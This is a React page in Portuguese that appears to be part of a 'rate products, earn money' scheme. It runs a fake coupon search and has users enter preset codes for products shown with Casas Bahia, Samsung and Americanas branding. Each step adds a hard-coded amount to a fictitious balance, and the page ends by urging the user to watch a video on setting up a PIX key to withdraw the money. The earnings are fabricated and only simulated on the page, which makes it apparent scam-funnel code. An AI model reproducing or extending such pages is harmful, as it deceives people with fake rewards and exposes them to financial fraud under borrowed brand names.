"use client";
import { useEffect, useRef, useState } from "react";
import Header from "../components/Header";
import RadarSearch from "../components/RadarSearch";
import CodeEntry from "../components/CodeEntry";
import RatingCard from "../components/RatingCard";
import BalanceUpdatedModal from "../components/BalanceUpdatedModal";
import { playWinSound } from "../lib/sound";

const products = [
  {
    name: "Fogão Brastemp",
    brand: "Casas Bahia",
    brandColor: "#0D47A1",
    value: 69.56,
    code: ["U", "V", "W", "X"],
    image: "/images/products/fogao-brastemp.png",
  },
  {
    name: "Galaxy S24 Ultra",
    brand: "Samsung",
    brandColor: "#1428A0",
    value: 70.12,
    code: ["K", "L", "M", "N"],
    image: "/images/products/galaxy-s24.png",
  },
  {
    name: "Jogo de panelas",
    brand: "Americanas",
    brandColor: "#E50019",
    value: 68.99,
    code: ["O", "P", "Q", "R"],
    image: "/images/products/panelas.png",
  },
];

export default function Resgatar() {
  const [state, setState] = useState({ type: "searching" });
  const [balance, setBalance] = useState(50);
  const [progress, setProgress] = useState(0);
  const [codeInputs, setCodeInputs] = useState(["", "", "", ""]);
  const [searchText, setSearchText] = useState("Buscando seu primeiro cupom...");
  const [couponFound, setCouponFound] = useState(false);
  const inputRefs = useRef([null, null, null, null]);

  useEffect(() => {
    if (state.type !== "searching") return;
    setCouponFound(false);
    setSearchText("Buscando seu primeiro cupom...");
    const t1 = setTimeout(() => {
      setCouponFound(true);
      setSearchText("");
    }, 2500);
    const t2 = setTimeout(() => {
      setState({ type: "code", productIndex: 0 });
    }, 4000);
    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
    };
  }, [state.type]);

  useEffect(() => {
    if (state.type !== "balance_updated") return;
    const idx = state.productIndex;
    const t = setTimeout(() => {
      if (idx < products.length - 1) {
        setCodeInputs(["", "", "", ""]);
        setState({ type: "code", productIndex: idx + 1 });
      } else {
        setState({ type: "final" });
      }
    }, 2500);
    return () => clearTimeout(t);
  }, [state]);

  const progressPct = (progress / 6) * 100;

  function handleCodeInput(i, value) {
    if (state.type !== "code") return;
    const product = products[state.productIndex];
    const upper = value.toUpperCase().slice(-1);
    const next = [...codeInputs];
    next[i] = upper;
    setCodeInputs(next);
    if (upper && i < 3 && inputRefs.current[i + 1]) inputRefs.current[i + 1].focus();
    if (next.every((c, idx2) => c === product.code[idx2])) {
      setTimeout(() => {
        setState({ type: "evaluate", productIndex: state.productIndex });
      }, 500);
    }
  }

  function handleEvaluate() {
    if (state.type !== "evaluate") return;
    const idx = state.productIndex;
    setBalance((b) => Math.round((b + products[idx].value) * 100) / 100);
    setProgress(idx + 1);
    setCodeInputs(["", "", "", ""]);
    setState({ type: "balance_updated", productIndex: idx });
  }

  return (
    <div className="min-h-screen bg-[#f5f7fa] flex flex-col">
      <Header balance={balance} />
      <div className="w-full bg-[#e8e8e8] h-2">
        <div className="h-full bg-[#00C853] transition-all duration-700 ease-out" style={{ width: `${progressPct}%` }} />
      </div>
      {state.type !== "searching" && state.type !== "final" && (
        <p className="text-center text-xs text-[#999] mt-2">Seu progresso: {progress}/6</p>
      )}
      <div className="flex-1 flex flex-col items-center justify-center px-4 py-6">
        {state.type === "searching" && <RadarSearch searchText={searchText} couponFound={couponFound} />}
        {state.type === "code" && (
          <CodeEntry product={products[state.productIndex]} codeInputs={codeInputs} inputRefs={inputRefs} onInput={handleCodeInput} />
        )}
        {state.type === "evaluate" && <RatingCard product={products[state.productIndex]} onEvaluate={handleEvaluate} />}
        {state.type === "balance_updated" && <BalanceUpdatedModal value={products[state.productIndex].value} />}
        {state.type === "final" && <FinalCard balance={balance} />}
      </div>
    </div>
  );
}

function FinalCard({ balance }) {
  useEffect(() => {
    playWinSound();
  }, []);
  return (
    <div className="flex flex-col items-center">
      <div className="bg-white rounded-2xl shadow-lg p-10 flex flex-col items-center gap-4 max-w-sm w-full">
        <div className="w-20 h-20 flex items-center justify-center">
          <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
            <circle cx="32" cy="32" r="28" stroke="#00C853" strokeWidth="4" fill="none" />
            <path d="M20 32l8 8 16-16" stroke="#00C853" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round" fill="none" />
          </svg>
        </div>
        <h2 className="text-2xl font-bold text-[#1a1a2e]">Parabéns!</h2>
        <p className="text-[#888] text-sm">Você acumulou o saldo de</p>
        <p className="text-4xl font-bold text-[#0E7C3C] italic">{`R$ ${balance.toFixed(2).replace(".", ",")}`}</p>
        <p className="text-sm text-[#888] text-center leading-relaxed mt-2">
          Veja o vídeo de 2 minutos, com um passo a passo explicativo para você aprender cadastrar sua chave <strong className="text-[#1a1a2e]">PIX</strong> e
          realizar o seu primeiro saque!
        </p>
        <button
          onClick={() => {
            window.location.href = "/video";
          }}
          className="w-full bg-[#00C853] hover:bg-[#00b848] text-white font-bold text-base py-4 rounded-xl transition-all cursor-pointer flex items-center justify-center gap-2 mt-2"
        >
          Assistir vídeo
          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
            <polygon points="5 3 19 12 5 21 5 3" />
          </svg>
        </button>
      </div>
    </div>
  );
}
